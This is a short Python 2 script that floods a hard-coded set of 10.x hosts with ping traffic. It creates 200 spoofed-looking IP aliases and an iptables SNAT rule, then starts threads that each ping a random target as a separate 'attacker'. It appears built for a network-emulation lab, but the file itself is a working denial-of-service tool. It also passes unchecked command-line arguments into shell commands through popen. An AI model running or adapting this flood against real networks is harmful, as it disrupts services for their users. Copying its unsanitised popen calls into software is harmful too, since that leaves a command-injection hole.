


from os import popen
from random import randrange
import threading
import sys

interface = " 0_0_2-eth0:"
hosts = ["10.0.0.2","10.0.0.3","10.0.1.2","10.0.1.3","10.1.0.2","10.1.0.3","10.1.1.2","10.1.1.3","10.2.0.2","10.2.0.3","10.2.1.2","10.2.1.3","10.3.0.2","10.3.0.3","10.3.1.2","10.3.1.3"]



def setUp():
    """set up IP aliases on an interface"""
    print "creating IP aliases..."
    for i in range(1,200):
        args = interface+str(i)+" 10.0.100."+str(i)
        popen("ifconfig "+args)
    print "done."

    print "setting up reverse NAT..."
    popen("iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to 10.0.200.1-10.0.200.200")
    print "done."







class PingClient(threading.Thread):

    def __init__(self,hostIP,attempts,target):
    	threading.Thread.__init__(self)
        self.ipaddr = "10.0.100."+str(hostIP)
        self.attempts = str(attempts)
        self.target = target

    def run(self):
    	print "attacking from "+self.ipaddr
        ping = "ping -s 1000 -c "+self.attempts+" -I "+self.ipaddr+" "+self.target
        popen(ping)
        



def pingFlood(numberOfAttackers,attempts):
    setUp()
    #print "starting "+numberOfAttackers+" attacks."
    for attacker in range(1,int(numberOfAttackers)):
    	target = hosts[randrange(len(hosts))]
        attack = PingClient(attacker,attempts,target)
        attack.start()


if len(sys.argv)!=3:
	print "Usage: PingFlood.py numberOfAttackers numberOfAttempts"
	sys.exit(0)
numberOfAttackers = sys.argv[1]
numberOfAttempts = sys.argv[2]

pingFlood(numberOfAttackers,numberOfAttempts)








